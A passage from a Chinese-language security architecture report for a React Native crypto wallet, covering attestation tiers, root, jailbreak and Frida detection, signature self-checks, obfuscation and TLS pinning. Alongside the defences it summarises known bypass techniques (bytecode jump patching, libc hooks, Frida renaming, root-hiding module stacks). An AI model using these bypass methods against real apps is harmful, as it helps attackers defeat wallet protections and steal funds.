- **服务端判决**：token 为嵌套 JWT（JWE A256KW/A256GCM 包 JWS ES256），走 `playintegrity.googleapis.com/v1/{pkg}:decodeIntegrityToken` 服务端解码；nonce 一次性、60–120s TTL、验后即焚；判决永不落地客户端 [^85^]。
- **先观测后强制**：上线后 ≥2 周只记录 verdict 分布再开拦截（业内报告 8–12% 装机量只有 BASIC）。

#### 3.8.3 库选型

首选 **`@expo/app-integrity`**（Expo 官方、Android=Play Integrity Standard、iOS=App Attest；**但处 alpha，锁版本使用**）或 bluesky 官方开源的 **`react-native-device-attest`**（生产验证）；用 **`@pagopa/io-react-native-integrity`** 补 Android Key Attestation 与 `isPlayServicesAvailable` 探测（无 GMS 降级触发逻辑所需）。**禁用 `react-native-google-play-integrity`**——Snyk 判定 INACTIVE，2 年未更新 [^31^]。iOS 侧：App Attest（DCAppAttestService）为主——每安装 attest 一次（经 Apple 服务器），后续敏感请求用 generateAssertion（含 counter 防重放）；isSupported=false 视为风险信号；DeviceCheck 仅作 legacy 兜底；Apple 官方建议拒绝时优雅降级而非硬阻断 [^86^]。注意 App Attest 服务端验证 `fmt: apple-appattest` 与 WebAuthn apple 格式不同，@simplewebauthn/server 不能直接验。

### 3.9 分级处置决策表

动作面定义：**A=只读浏览**（余额/地址/历史）、**B=收款地址展示**、**C=交易构造与签名广播**、**D=助记词/私钥导出**、**E=安全设置变更**。

| 级别 | 检测信号（组合判定，服务端 verdict 为准） | A 浏览 | B 收款 | C 签名 | D 导出 | E 改设置 | 附加动作 |
|---|---|---|---|---|---|---|---|
| L0 绿 | STRONG + PLAY_RECOGNIZED（或 iOS attested key + assertion 正常） | ✅ | ✅ | ✅ | ✅ | ✅ | 免 step-up |
| L1 绿- | DEVICE（无 STRONG）；或 Key Attestation 通过（TEE + locked + VERIFIED） | ✅ | ✅ | ✅+二次确认 | ✅+密码+延时 | ✅+二次确认 | 记录 verdict |
| L2 黄 | 仅 BASIC；或 attestation 服务瞬时不可用重试失败 | ✅+风险提示横幅 | ✅ | ⚠️ 限额+额外认证 | ❌ | ❌ | 触发 GET_INTEGRITY 修复对话框 |
| L3 橙 | UNRECOGNIZED_VERSION（重打包/侧载）；或 appAccessRisk 检出 UNKNOWN_CAPTURING/CONTROLLING/OVERLAYS | ✅+强警告 | ✅ | ❌ | ❌ | ❌ | 风控后台告警 |
| L4 红 | 无 verdict（root+hooking/攻击迹象）；playProtectVerdict=HIGH_RISK；attestation rootOfTrust=unlocked/FAILED | ✅ 只读 | ⚠️ 标红提醒 | ❌ | ❌ | ❌ | 服务端冻结该设备会话写接口；通知注册邮箱 |
| L5 服务不可用 | Play/Apple 服务器不可达且重试失败 | ✅ | ✅ | ⚠️ 限额+队列复核 | ❌ | ❌ | fail-open 于读、fail-closed 于写密钥面；不计入负面记录 |

**为什么不硬退出**（三条独立论据）：其一，合规口径上 OWASP MASVS-RESILIENCE-1 原文是「either by **alerting** the user **or terminating** the app」——告警即合规，硬退出并非标准要求 [^87^]；其二，银行业实践（OneSpan 等）明确反对二元封禁：root≠恶意，现代攻击（钓鱼 overlay、无障碍滥用、重打包）在非 root 设备上同样成立，硬封只会误伤真实用户并教会攻击者隐藏 root，正确做法是「root 单独是黄灯、root+hooking 才是红灯」的组合信号与功能级限制 [^88^]；其三，Google/Apple 官方均提供修复引导（GET_INTEGRITY 对话框、degrade gracefully）而非封禁范式 [^84^][^86^]。

**冷钱包特别条款**：链上交易广播后不可撤回，故 C/D/E 列才是真正的资产防线——读侧放行保留用户自救通道（查看资产并转移到安全设备），密钥写侧 fail-closed。L4 下本地不删密钥、不锁死 App（避免误杀与对抗升级），但 Keystore/Keychain 中的密钥使用被门控：服务端证明通过前密钥不可用于 C/D/E——这是全章唯一一处 [P] 级的检测-响应耦合（门控由硬件密钥可用性执行，而非可被 patch 的 UI 逻辑）。所有判定事件写风控台账供策略调优。

---

## 第4章 防篡改与反逆向

> 承诺标注约定（与全书一致）：**[P] 已实现防护**（控制真实生效且可验证）/ **[C] 仅提高攻击成本**（可被足够耐心的高权限攻击者绕过，价值在于拉长攻击时间与产出风险信号）/ **[S] 占位接口**（接口在、实质防护未落地）。本章立场先行声明：**除「检测信号与密钥派生 fail-closed 耦合」这一架构控制外，本章所有端上检测机制一律标注 [C]**——在已 root/越狱的设备上，攻击者对运行环境拥有与本进程同级甚至更高的权限，任何客户端检测最终都可绕过。RootBeer 官方 README 的原话是「no root detection code can ever be 100% effective as when the user is root they are basically god on the device」[^89^]；这与 OWASP MASVS-R 对 RASP 的定位口径一致。把检测层写成「防护」是行业报告最常见的虚张声势，本章不做这种事。凡 3 天原型窗口内无法真机验证的项，一律列入 roadmap 并如实标注。

### 4.1 前提：Hermes 字节码等于明文，关键逻辑必须 native 化

React Native release 构建把 JS 预编译为 Hermes 字节码（Android 位于 `assets/index.android.bundle`，iOS 为 IPA 内 main.jsbundle）[^90^]。「字节码不是源码」在 2026 年已完全不构成任何混淆效果：

- **hermes-decomp（SymbioticSec）**支持 Hermes 字节码 v40–v99 全版本，可反编译出结构化可读的 JavaScript，并且以 MCP server 形态发布——意味着逆向者可以让 AI agent 直接驱动反编译器做批量分析，逆向门槛从「专家手工」降到「脚本小子+LLM」[^10^]。
- **hermes-dec（P1sec）**、**hbctool** 等工具链覆盖反汇编/重打包路径：hbctool 可以把 bundle 反汇编、修改条件跳转绕过检查、重新汇编打包再重签名，HackTricks 已将其写成标准渗透流程[^91^]。

实证结论：**Hermes 字节码必须按明文对待**。这一前提直接推导出 NexVault 的代码分层原则——

| 层 | 允许放置 | 禁止放置 | 理由 |
|---|---|---|---|
| JS 层（Hermes 字节码，明文） | UI 编排、行情展示、只读状态机、埋点 | 私钥/助记词/派生中间值、检测裁决逻辑、校验期望值、风控阈值常量 | 一切 JS 常量与分支逻辑可被 hermes-decomp 读出、被 hbctool 改跳转绕过 |
| Native 层（Kotlin/Swift/C++，.so/.dylib） | 密钥派生与签名闭环、签名校验、bundle 哈希自检、检测信号采集与聚合、fail-closed 裁决 | 可被单次 hook 定点改写的「孤立法」判定函数 | 编译产物逆向成本高于字节码，且可叠加混淆/VMP（4.3） |
| 服务端 | 设备证明验证（Play Integrity/App Attest）、风险评分、策略裁决、nonce 去重 | 信任客户端上报的任何布尔结论 | 客户端 verdict 可伪造，服务端必须独立验 token |

分析：这张表的核心推论是「**检测层的正确形态不是拦截器，而是信号源**」。若把「检测到 root 就拒绝签名」写在 JS 层，攻击者用 hbctool 改掉一个条件跳转即可绕过；即使写在 native 层，Frida 一个 `Interceptor.attach` 改写返回值也能绕过。唯一能在 root 设备上保住资金的设计是 **fail-closed 耦合**：检测信号的聚合结果作为密钥派生/释放的前置输入之一，检测不通过则 native 层根本不派生、不释放签名材料——攻击者即使伪造了「未 root」的判定返回值，也无法凭空造出签名材料。这是本章唯一标注 [P] 的控制，其余检测机制的价值是**攻击成本定价器 + 遥测信号**：把攻击者从「改一行字节码」逼到「需要定位并绕过一组分散、混淆、互相校验的 native 检测点」，同时把异常环境信号上报服务端参与风控。3.1 节「私钥不出 native」是本分层原则成立的大前提，两章互为条件。

### 4.2 MVP 六项逐项

六项均为 MVP 定案（dim09 裁决），但如实说明：**六项合计约 4.5–6 人日，超出 3 天原型窗口**。排期建议：Day 1 以 vault-core native 闭环（第 3 章）为最高优先级，检测层按 a → b → f 基础信号 → c 子集 → d → e 的顺序并行插入，c 的完整向量与 f 的 inline hook 序言自检允许溢出到 Day 4 或首个迭代。每一项的「3 天工作量」为单人估算。

#### 4.2.a Android native 层运行时签名校验 —— [C]

**做法**：不经过 Java `PackageManager`（该路径是 MT Manager、ApkSignatureKiller 类一键工具的标准 hook 点），在 native 层自行解析 APK 的 v2/v3 签名块：从文件尾反查 EOCD（magic `0x06054b50`）→ 定位 Central Directory → 其前方即为 `"APK Sig Block 42"` 签名块 → 遍历 ID-Value 对（v2 ID `0x7109871a`，v3 ID `0xf05368c0`）→ 提取首个 signer 的 X.509 DER 证书 → 算 SHA-256 与编译期嵌入 .so `.rodata` 的期望值比对（期望值拆字节异或重建，防整块常量被二进制搜索定位）[^92^][^93^]。防重定向交叉校验：对已打开 fd 做 `fstat` 取 inode，与 `/proc/self/maps` 中 base.apk 映射行的 inode 比对，不一致说明 `open` 被 hook 重定向到攻击者预置的原版 APK[^94^]。

**2026 对抗现状**：该方案是大厂生产实践（小红书 libsentry.so 日志中可见 v3 chunk ID `0xF05368C0` 的解析痕迹）[^95^]，但正因为成熟，攻击路径也已标准化——Guardsquare 记录了标准绕过：重打包者把原 APK 塞进 assets，hook libc `open`，当 RASP 读取 base.apk 时替换路径指向原包，校验全部通过[^96^]。因此单点签名校验只挡「naive 重打包工具党」，对定向攻击者必须叠加 inode 交叉校验、raw syscall（SVC 直调 `openat` 绕过 libc hook）、以及污染式响应（校验失败不直接 abort，而是让密钥派生得到错误材料）。

**库与版本**：无第三方库，自研 C/C++ 模块（公开完整 C 实现可作起点[^92^]），约 300–500 行。

**3 天工作量**：0.5–1 天。上传密钥证书指纹在构建前已知，单次构建即可嵌入，无两段构建问题；真机验证项为重打包重签后自检是否命中。

#### 4.2.b JS bundle 哈希自检 —— [C]

**做法**：native 层读取 `assets/index.android.bundle`（APK 内 stored 条目，可直接 mmap 或经 `AAssetManager_open` 一次性取 handle），算 SHA-256 与编译期嵌入 .so 的期望值比对。**校验值嵌入 native .so，不放 assets**——放 assets 等于把答案和试卷放在同一可被整体替换的文件里。工程要点：bundle 在 `assembleRelease` 后才最终确定，需两段构建（打包 → 算哈希 → 重编/回填 so → 重签名），或用「固定 32 字节占位段 + 签名前回填 + zipalign + apksigner」的流水线[^97^]。

**2026 对抗现状**：v2/v3 整包签名本身已覆盖 assets——静态改 bundle 必然破坏签名从而触发 4.2.a；bundle 自检的独立价值在两点：①防「内存补丁 Hermes 字节码 / hook Hermes 解释器」这类不动磁盘文件的攻击；②作为签名校验被绕过时的独立第二信号。对抗面同样明确：攻击者连 .so 一起 patch 期望值即可，因此期望值必须参与后续密钥派生（污染式耦合），使「改期望值」与「得到正确密钥」不可兼得。

**库与版本**：无第三方库；CI 侧一段哈希生成脚本（Node/Python 均可）。

**3 天工作量**：0.5 天（native 读取+比对）+ 0.5 天 CI 两段构建改造；若 Day 3 CI 回填流水线未跑通，降级方案为「首启运行时计算哈希上报服务端比对」，并把流水线改造列入首个迭代验收项。

#### 4.2.c Root / Magisk / KernelSU / Zygisk / Shamiko 检测 —— [C]

**做法**：**不引入 RootBeer 作为唯一检测依据**。RootBeer 并未停更——0.1.1 适配了 Android 15 与 16KB page size，0.1.2（2024-09-18）补了 `/system_ext/bin` su 路径[^89^]——但其检测向量本质是 2016 时代遗产（su 路径、dangerous props、可写分区、包名），对 DenyList/Shamiko 级隐藏无对抗能力。定案为自研 native 检测模块，采纳 Hunter / Native Test（vvb2060）类检测器的向量思路：mounts/mountinfo/maps 多源交叉 + namespace 失配 + SVC 裸调 errno 抽样，检测逻辑集中在单个混淆 sealed 模块内，不暴露可读的 JNI 调用链，命中即 fail-closed 且不日志不提示[^98^][^99^]。

**2026 对抗现状（猫鼠游戏编年）**：LRFP-Team 维护的检测器/绕过器编年显示对抗栈逐年下沉——2022 年 Magisk+Zygisk+Shamiko+LSPosed+HMA；2024 年加入 PIF（Play Integrity Fix）+ Tricky Store；2025 年 SUSFS/NoHello、VBMeta Fixer、HMAL；**2026 年第一季现役栈为 SukiSU-Ultra（LKM/SUSFS 内核模块）+ Zygisk Next ≥v1.3.0 + LSPosed fork + PIF + TEESimulator + VBMeta Fixer + Audit Patch + FuseFixer + HMA + Cleanup**[^100^]。攻击面已下沉到 LKM（可加载内核模块）级，用户态文件/属性检测对该栈大面积失效。检测向量有效性盘点：

| 向量 | 对 Shamiko 级隐藏有效性 | 说明 |
|---|---|---|
| su 路径（/system/bin/su 等） | 失效 | Shamiko 过滤信息面而非环境，经典 RootBeer 向量全灭[^98^] |
| Magisk 包名 / installer | 失效 | HMA 对抗，包名可随机化 |
| ro.debuggable / SELinux 属性 | 可伪造 | 属性可被模块改写 |
| mount namespace 失配（/proc/mounts × mountinfo 交叉） | **仍有效** | Shamiko 卸载挂载点造成命名空间不一致，当前检测主战场[^98^] |
| OverlayFS/bind mount marker | 部分有效 | magisk/kernelsu/apatch/sukisu/debug_ramdisk 等 18 项 marker；APatch 的 `/debug_ramdisk` tmpfs 行是已知命中特征[^99^] |
| PID namespace 不一致 | **仍有效** | 进程隐藏造成的矛盾 |
| syscall errno 模式偏离（裸 SVC vs libc 包装） | 有效但内核相关 | SUSFS 在内核态过滤，errno 行为与原生内核有细微差异[^98^] |
| Zygisk 特征（maps 条目/soinfo 异常） | 部分 | Zygisk Next 2026-06 起闭源持续更新，猫鼠进行中[^100^] |

分析：这张表揭示的结构性事实是「**隐藏行为本身制造新的可检测痕迹**」——Shamiko 拦截并篡改 syscall 响应来隐藏 root 工件，但篡改造成 mounts 与 mountinfo 不一致、errno 语义偏离，防御者的主战场已从「找 root 文件」迁移到「找隐藏机制留下的不一致」[^101^]。然而对 LKM 级 SUSFS，用户态检测接近免疫，这一点必须承认：**Root 检测在 2026 年的正确定位是概率性风险信号 + fail-closed 闸门，而不是门禁**。任何「检测到 root 即弹窗拒绝」的设计既误伤（custom ROM 用户）又必被绕过；正解是信号进服务端风险评分，同时签名材料释放走 fail-closed。

**库与版本**：自研 native 模块（RootBeer 0.1.2 仅作低级配置的补充信号源，可选引入）；向量参考 Hunter/Native Test 公开实现[^99^]。

**3 天工作量**：完整向量盘点 3 天内不可完成。MVP 子集（mounts/mountinfo/maps 交叉 + su 路径 + props + SVC errno 抽样）约 1–1.5 天；LKM 级对抗向量与行为链检测列入 roadmap，并在报告与遥测字段中如实标注「对 SUSFS 级隐藏存在已知漏报」。

#### 4.2.d iOS 越狱检测 —— [C]

**做法**：以 IOSSecuritySuite（securing/IOSSecuritySuite，仍在收 PR、支持 SPM/CocoaPods/源码集成）为基线，自补三类向量：`/var/jb` 路径族（Dopamine rootless 越狱的全部工件前缀，iOS 15+ SSV 只读系统卷所致，deb 架构标记 `iphoneos-arm64`）[^102^]、dyld 遍历（systemhook.dylib、Ellekit、FridaGadget、Shadow 等可疑库）、sysctl/kern.boottime 异常[^103^]。

**2026 对抗现状**：IOSSecuritySuite 官方 README 的 TODO 明确列着「Dopamine hidejb detector」未完成——作者自认对 Dopamine 2.4+ 的 Hide Jailbreak 无覆盖[^103^]。Digital.ai 2025-11 实测披露了关键事实：Dopamine 2.4.x 的 Hide Jailbreak 开关不是「隐藏」而是「**按需不注入**」——对目标 app 卸载 `/var/jb`、不注入任何 tweak，app 进程空间是真干净，成熟检测库全部报告「未越狱」；Dopamine-RootHide 进一步随机化挂载路径与 systemhook.dylib 文件名，路径检测直接作废[^104^]。残余可检测面只剩内核级改动痕迹、系统内其他越狱进程、行为异常、以及硬件背书的 App Attest。另需如实记录：ISS 类检测的判定函数被一条 Frida `Interceptor.attach` 改写返回值即可绕过[^105^]。

**结论性定位**：iOS 越狱检测 = [C] + 风险信号；**严禁把越狱判定作为签名前置硬条件**（误伤与被绕过双输），降级为服务端风险评分输入；对 Hide Jailbreak 模式的漏报是机制性、不可修的，兜底在 App Attest（服务端验）与 fail-closed 密钥释放。

**库与版本**：IOSSecuritySuite（最新 mainline，SPM 集成）+ 自补 Swift 模块。

**3 天工作量**：0.5 天（ISS 集成 + `/var/jb`/dyld/sysctl 自补）；Dopamine Hide 对抗面无客户端解，不排期，仅写入风险台账。

#### 4.2.e 反调试 —— [C]

**做法**：Android 侧 `ptrace(PTRACE_TRACEME)` self-attach + 读 `/proc/self/status` 的 TracerPid + 遍历 `/proc/self/task/*/stat`，检测点分散埋设、使用内联 SVC 而非 libc 包装；iOS 侧 `ptrace(PT_DENY_ATTACH=31)` 经 `dlsym(RTLD_DEFAULT,"ptrace")` 动态解析调用 + `sysctl(KERN_PROC pid)` 查 `P_TRACED` 标志位配套[^106^]。

**2026 对抗现状**：单点绕过是教科书操作——Frida hook libc `ptrace` 恒返回 0、`LD_PRELOAD` 覆盖 `ptrace`[^107^]；iOS 侧二进制 patch（`movz w0,#0x1f` 改为 `#0x0`）或 Frida hook 同样 trivial[^106^]。梆梆企业版 2025-08 被公开完整绕过的案例是重要教训：攻击者用 Stalker 定位检测函数 → hook open/read 伪造 TracerPid=0 → hook kill 阻止自杀 → dump 解密 DEX；**梆梆的失败在于反调试逻辑是固定点位 + 标准 syscall 调用，等于给攻击者递上精准 hook 点**[^108^]。推论：检测点必须分散、调用必须内联 SVC、结果必须以污染数据流方式作用而非直接 kill。

**iOS App Store 审核现状**：`PT_DENY_ATTACH` 非文档化但**未被明令拒绝**；历史上有直接链接调用触发审核风险的报告，社区标准做法就是上述 `dlsym` 动态解析降低静态可见度[^106^]。列为灰区项：保留开关，若审核质询可热摘除。

**库与版本**：无第三方库，自研双平台代码各约 100 行。

**3 天工作量**：0.5 天；真机验证项为 lldb/gdb attach 是否触发信号。

#### 4.2.f Frida 多信号交叉检测 —— [C]

**做法**：5–6 类信号并发采集、交叉计分、结果污染化（不直接弹窗/退出）：

| 信号 | 实现要点 | 2026 绕过成本 |
|---|---|---|
| 默认端口 27042 + D-Bus AUTH 探测 | connect 本机端口发 D-Bus 握手 | 低：frida-server `-l` 改任意端口；Gadget 模式无 server 直接失效 |
| /proc/self/maps 字符串（frida-agent、frida-gadget、LIBFRIDA） | openat+read 逐行扫描 | 低：重编译改名即废（brida 实测把 frida-agent 改 brida-bgent、re.frida.server 改 re.brida.server，maps/fd 全干净）[^109^] |
| 线程名（gum-js-loop、gmain、gdbus、pool-frida） | /proc/self/task/*/stat、status | 中低：同样可被重编译改名 |
| /proc/self/fd 命名管道（linjector-xxx） | readdir+readlinkat | 低：同上 |
| 可执行段可写（rwxp 映射） | maps 权限位扫描 | 中：属 Frida 工作机理级信号，改名无效；但 JIT 等合法场景有误报面 |
| **inline hook 序言字节自检** | 对 open/read/ptrace 等关键函数内存中比对前 N 字节：ARM64 被 Frida patch 的序言以无条件跳转 `B`（编码 0x14xxxxxx）开头，与合法序言（STP/PACIASP 等）不符 | 当前最高：攻击者需先发现自检函数本身，属「自检检测器」的元对抗[^110^] |

分析：表内每一行都有公开绕过脚本——端口类被 Gadget 模式与改端口双杀，名字类被 brida 式重编译双杀，这正是「承认单层可绕过」的实证依据[^109^]。该层的正确目标是**把 Frida 使用成本从「脚本小子跑公开脚本」抬到「需要定制构建 frida-agent + 逆向自检逻辑」**，而非阻止。inline hook 序言字节比对是当前性价比最高的一阶信号，建议进 MVP；同时所有信号结果必须汇入 4.2.c 的聚合裁决与 fail-closed 耦合，禁止任何单信号直接触发用户可见行为（误报面会伤害正常用户，且给攻击者提供清晰的调试反馈）。

**库与版本**：无第三方库，自研 native 模块。

**3 天工作量**：基础四信号（端口/maps/线程名/fd）0.5 天；inline hook 序言自检 0.5–1 天，允许溢出到 Day 4。

### 4.3 Roadmap 方案要点

以下各项 3 天窗口内不可验证，全部列入 roadmap；除标注外性质均为 [C]。

#### 4.3.1 APK v2/v3 签名块深度自解析

MVP（4.2.a）只取首个 signer 证书指纹。Roadmap 增量：

- **v3 lineage（密钥轮换）支持**：v3 块含轮换证书历史，校验逻辑必须接受 lineage 内任一证书而非单一指纹，否则合法换密钥后自检误杀——MASTG-KNOW-0003 明确指出此测试点[^111^]。
- **Play App Signing 双指纹问题**：启用后 Google 持有分发密钥、开发者持有上传密钥，**设备上 APK 的实际签名证书是 Google 的分发证书**——嵌入指纹必须取 Play Console 的 App signing certificate SHA-256；官网直链包若自签，需维护「分发证书 + 自签证书」双指纹白名单，与 4.4 的 Developer Verification 注册共用同一份密钥台账。
- **多 signer / v3.1（API 33+ source stamp）**：按 signer 序列遍历取全部指纹做集合比对。
- 可选完整 v2 内容摘要验证（1MB 分块 digest 与 signed data 比对）——成本高，一般不必要：整包篡改已由系统安装时 v2 验签兜底，攻击者必须重签，重签即换证书，校验证书指纹已覆盖核心场景。

#### 4.3.2 o-mvll 控制流混淆与符号剥离

原版 obfuscator-llvm 停滞在 LLVM 4.0 时代，与现代 NDK（r21+）完全不兼容，社区 fork（Hikari 及各修复版）质量参差[^112^]。**2026 年的现役正解是 open-obfuscator/o-mvll**（Quarkslab 系，活跃维护，明确支持 Android NDK 与 iOS toolchain，AArch64/ARM，提供控制流平坦化、字符串加密、opaque constants 等 pass），以 `-fpass-plugin` 形式挂入现有 NDK clang 构建，改造成本远小于更换整套 toolchain[^113^]。集成纪律：

- 仅对检测模块（libsecurity.so）与密钥相关 so 启用，避免全量混淆的体积/性能/稳定性风险；
- 配合 `-fvisibility=hidden`、strip、`RegisterNatives` 动态注册（去掉可读的 JNI 函数名表）；
- 混淆 pass 与 LTO/PAC/BTI 的兼容性必须真机矩阵回归；
- 收益定位 [C]：对抗静态分析与定位检测点的速度。针对 o-mvll 已有 deflat/符号执行（angr）对抗研究，不得假设不可逆[^113^]。

#### 4.3.3 商用加固对比与「只 VMP 核心 so」分层策略

| 方案 | 归属 | 价格级（2026） | 启动/运行时代价 | 与 NexVault 匹配度 |
|---|---|---|---|---|
| Guardsquare DexGuard | 比利时 | 官方不公开；Vendr 成交均值 ~$44k/年、峰值 ~$83k（第三方估算）[^114^]；代理商口径 from $5k/年[^115^] | 构建期处理，运行时开销随启用层而定 | 高：海外厂商、Gradle 插件、复用 R8 配置；Android-only |
| Guardsquare iXGuard | 同上 | 代理商口径 from $10k/年[^115^] | 同左 | iOS 侧配对项；双平台 TCO 近似翻倍；与 Hermes 字节码兼容性需实测 |
| Promon SHIELD | 挪威 | 企业定制报价，无公开价[^115^] | post-compile 无源码集成，官方称用户不可见 | 高：北欧银行背书，post-compile 适合直接加固 RN 产物 |
| Licel DexProtector | 爱尔兰 | 企业报价 | — | 高：EMVCo 认证，支付/金融科技口碑，含白盒密码模块 |
| 梆梆安全 | 中国 | 中高档 | **实测冷启动 +800~1500ms，低端机 ANR 率 4.7%+**[^108^] | **排除**：启动代价对钱包不可接受；2025-08 反调试被公开完整绕过[^108^]；海外产品信任叙事不匹配 |
| 娜迦（NAGA） | 中国 | 中档 | 中等 | **排除**：近年声量下降、存在成熟脱壳方案[^108^]、同样地域匹配问题 |

分析：价格信号与性能信号指向同一个结论——**全量商用壳对冷钱包不划算**。梆梆/娜迦的排除理由不是「国产=差」而是三条可验证的硬指标：冷启动 +800ms 级代价直接撞上 4.6 的性能红线；梆梆固定点位反调试被完整公开绕过说明「贵≠抗绕」；不面向中国大陆的产品采购中国厂商加固，在海外合规与信任叙事上是负资产。DexGuard ~$44k/年量级的费用（Vendr 成交数据，非官方报价，存在按规模弹性）对一个可用自研方案覆盖大部分威胁面的项目而言，应作为触发制采购而非默认项[^114^][^115^]。正解是分层策略：**第一层**自研 native 检测 + o-mvll 混淆全部检测/密钥 so（roadmap 第一阶段）；**第二层**仅对 1–2 个最关键函数（签名材料拼装、检测裁决聚合）做 VMP 化——国内加固横评的分层共识佐证了这一思路：普通壳 5 分钟可破、VMP 需数天到数周、全虚拟化「接近不可逆」但冷启动 +200ms~1.5s[^108^]，因此把 VMP 面收窄到个位数函数，可将启动代价控制在 <100ms；**第三层**商用壳留作触发项——触发条件写明两条：①外部渗透测试或监管/合作方审计提出硬性要求；②出现规模化盗版重打包分发事件。届时优先 Promon SHIELD（post-compile 与自研 native 层兼容）或 DexGuard+iXGuard 组合。开源参照 XopProtector（2026-09，PDX1 DEX 加密 + PVM2 真 VMP + SO .text 自保护）可作技术调研样本，不建议生产直接使用[^116^]。

#### 4.3.4 反 Frida 深化

- inline hook 序言字节自检从 MVP 的「关键 libc 函数」扩展到「检测模块自身导出函数 + Hermes 解释器热点」，形成自检的自检（元对抗）；
- rwxp 段扫描与 JIT 白名单细化，压低误报面；
- 检测点行为链化：梆梆案例的教训（固定点位=递 hook 点）[^108^]，roadmap 阶段把检测结果编码进正常数据流（如密钥派生的盐值分量），移除一切「检测→分支」的可观察形态。

### 4.4 平台层：Android Developer Verification 的定位边界

**事实（截至 2026-10-14）**：2026-09-30 起，巴西、印尼、新加坡、泰国四国的 GMS 认证设备上，通过 7 家 participating stores（Google Play、Samsung Galaxy Store、Xiaomi GetApps、HONOR App Market、OPPO App Market、vivo V-Appstore、Transsion Palm Store）安装的应用，其包名必须注册到已验证开发者，否则正常路径拒绝安装[^117^][^118^]。**官网 APK 直链与非参与商店不在首阶段范围**（Google FAQ 阶段限定，经 Google 社区经理澄清确认）[^118^]；2027 年全球扩展后覆盖认证设备上**所有安装路径（含 APK 直链）**，届时未注册包只能走 ADB 或 advanced flow（开发者选项 + 重启 + 24 小时等待 + 多步警告）——普通用户安装转化率会崩塌式下降，且会把用户训练成「习惯绕过安全警告」的高危人群[^119^]。注册路径：Play Console 账号持有者可直接在 Android developer verification 页注册「不通过 Play 分发」的包名，提交签名证书 SHA-256，并按流程用含 `assets/adi-registration.properties` challenge 的同密钥测试 APK 证明密钥持有（不要求生产包）；Full Distribution $25 一次性，注册后同密钥后续构建无需重复证明[^120^][^121^]。

**遏制逻辑与局限**：该系统做的是**身份归因而非内容审核**——「机场查 ID 不查行李」，Google 不判断 app 是否恶意[^122^]。它对重打包的遏制是间接的：恶意重打包者必须用自己的真实身份注册并提交签名 APK，提高了作恶成本与可追溯性。但三个局限决定了它**挡不住「已注册开发者包被另一个已注册身份重打包分发」**：①只覆盖 GMS 认证设备（纯 AOSP/GrapheneOS/中国大陆 ROM 不受影响）；②攻击者同样能完成注册；③不验证安装包内容与被篡改前是否一致。

**结论**：平台层证明「这个包名属于某个真实身份」，只有应用内自检能证明「这个二进制就是我签的那个」——**本地 native 签名校验（4.2.a）仍是重打包场景下端上唯一兜底**，二者互补缺一不可。行动项（约半天，已在 dim12 裁决）：立即在 Android Developer Console/Play Console 注册官网分发包名 + 提交 EAS 托管 keystore 的 SHA-256 备 2027；官网 APK 与 Play 版共用同一签名密钥，避免密钥注册与跨渠道更新分裂[^121^]。标注：注册动作本身为 [S]（占位），生效后平台侧为限域 [P]（仅身份归因，非内容保证）。

### 4.5 网络层 MVP：TLS pinning 边界与请求防重放

#### 4.5.1 双 SPKI pin 定案

定案：**`@bam.tech/react-native-app-security@1.0.0`（2026-04-16 发布，GitHub 225★、未归档、Expo config plugin 原生支持）**，iOS 侧底层为 TrustKit（auto-setup，Info.plist 写 TSKConfiguration），Android 侧为自定义 `OkHttpClientFactory` + `CertificatePinner`，在 RN 启动早期安装进 `OkHttpClientProvider`[^123^][^124^][^125^]。配套事实修正：TrustKit 并未归档——iOS 3.0.7（2025-06）、Android 1.1.5（2026-08-17 重新发布并迁移 Maven Central），低活跃但非弃库[^126^]。

Pin 纪律（OWASP 口径）：只 pin **自有 API 域名**（不 pin 公共链 RPC、CDN、第三方 SDK——第三方换证书会造成全量锁死且不可控）[^127^]；**pin SPKI 而非整张叶子证书**（公钥可跨同 key 续期）；**每域名至少双 pin**（当前 leaf SPKI + 备用 SPKI，备用可为离线保存的下一把服务器 key 或受控 intermediate）；**禁止 pin 根 CA**（把信任面扩大到该 CA 下所有 intermediate，与冷钱包收窄信任的目标相反）[^128^][^129^]。轮换三段式：T-30~90 天新版同时携带 old+new pin → T0 服务端切 new key → 旧 pin 保留至最低支持版本退出后移除。失败策略 fail-closed：自有 API pin mismatch 时拒绝连接，可提供只读降级页，**绝不提供「继续并绕过 pin」按钮**（用户 click-through 会摧毁 pin 的全部安全目标）[^128^]。Android 官方文档同样要求 always include a backup key，否则换钥只能发版解救[^130^]。

**覆盖边界（源码级实证）**：

| 栈 | Android RN | iOS RN |
|---|---|---|
| `fetch`/XHR | `NetworkingModule.kt` 走 `OkHttpClientProvider.getOkHttpClient()`，pin 覆盖[^131^] | URLSession + TrustKit swizzle 覆盖 |
| 标准 `WebSocket` | `WebSocketModule.kt` 同样走 OkHttp provider，pin 覆盖[^131^] | `RCTWebSocketModule.mm` 当前导入并构造 **SocketRocket `SRWebSocket`，不是 URLSessionWebSocketTask**——TrustKit 的 URLSession swizzle **不自动覆盖**[^132^] |
| MVP 策略 | 可保留只读 WS | **敏感数据/写操作不走 RN WebSocket**；用 pinned REST，或自写 pinned URLSessionWebSocketTask |

分析：iOS WebSocket 缺口是「库 README 宣称全平台 pinning」与「源码实际覆盖」之间的典型裂缝——TrustKit swizzle 作用于 URLSession 体系，而 RN iOS 的 WebSocket 走 SocketRocket 独立栈，两者不相交。这类边界只能靠读 RN 源码确认，不能靠库文档推断。MVP 的处置是架构绕行（敏感写全走 pinned REST）而非补缺口；若未来必须承载敏感 WS，自写 `URLSessionWebSocketTask` + TrustKit validator 进入 roadmap，已在 dim10 风险台账记录。另需验证 BAM 的 factory 注册时机早于首个网络请求（启动 trace + 首请求测试），否则存在 pin 安装前的首请求窗口。

#### 4.5.2 Web 端：无法应用层 pinning 的诚实边界

浏览器 Web 端**没有可行的应用层 TLS pinning**：JS `fetch`/`WebSocket` 不能读取或替换浏览器 TLS 信任决策；HPKP（`Public-Key-Pins`）已被现代浏览器移除（低采用率 + 拒绝服务与敌意 pin 风险）[^133^]。Web 端只能依赖：HSTS（`max-age=63072000; includeSubDomains; preload`，注意首次访问仍是 TOFU，preload 只缩小窗口）[^134^]、CT（公开日志事后发现误签发，不等于客户端 pin）[^135^]、CAA、以及浏览器/OS PKI。用户安装恶意根证书后的 MITM，Web JS 无任何拒绝能力。

因此 Web 端定位为**只读低信任端**（与第 3 章三端信任分级一致）：不做助记词导入、私钥签名、广播写操作；服务端对 Web session 标记 `platform=web, assurance=low`，高危操作必须跳转 native app/硬件确认。WebCrypto 非导出 key（`extractable=false`）可作请求证明的降级方案——能防「直接复制 secret」，但防不了 XSS 在领地里调起 `sign()`，也不能证明硬件归属，**不得向风控宣称等价于 Secure Enclave/Keystore**[^136^]。

